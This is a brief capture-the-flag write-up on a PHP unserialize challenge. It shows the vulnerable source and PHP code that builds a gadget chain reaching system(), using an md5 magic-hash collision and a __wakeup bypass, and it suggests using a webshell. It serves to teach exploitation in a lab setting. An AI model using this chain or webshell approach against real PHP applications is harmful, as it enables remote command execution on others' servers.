# [CTF]PHP unserialize

## Content of file: index.php

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class C
{
    public $manba;
    function __get($argv)
    {
        $want = $this->manba;
        return $want();
    }
}
class YULIN
{
    public $cmd;
    function __invoke()
    {
        system($this->cmd);
    }
    function __wakeup()
    {
        $this->cmd = "nonono";
    }
}
class T
{
    public $sth;
    function __toString()
    {
        return $this->sth->var;
    }
}

class F
{
    public $user = "what can i say";
    public $notes;
    function __construct($user)
    {
        $this->user = $user;
    }
    function __destruct()
    {
        if ((string)$this->user!=='aabg7XSs'&&md5($this->user) == md5('aabg7XSs')) {
            echo $this->notes;
        }else{
            die("N0!");
        }
    }
}

if (isset($_GET['ser'])) {
    $ser = unserialize(base64_decode($_GET['ser']));
} else {
    echo "what is the MoShuFangFa???";
}
?> what is the MoShuFangFa???
```

## CTF

### The [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php#language.oop5.magic) in PHP



### Build the malicious attack chain 

It is easy to find the relations between the functions.

```php
$Yulin = new YULIN();
$Yulin->cmd = "base64 faster.py";

$CallFunction = new C();
$CallFunction->manba = $Yulin;

$String = new T();
$String->sth = $CallFunction;

$UserCompare = new F("aabC9RqS");
$UserCompare->notes = $String;

$ser = serialize($UserCompare);
```

**Attention**: When you build the attack link successfully, be sure every argument is valid after changing the command manually, especially the length of string.(except the essential errors, such like the incorrect number of arguments to bypass the magic method `__wakeup`) It is a better choice to use arguments and webshell.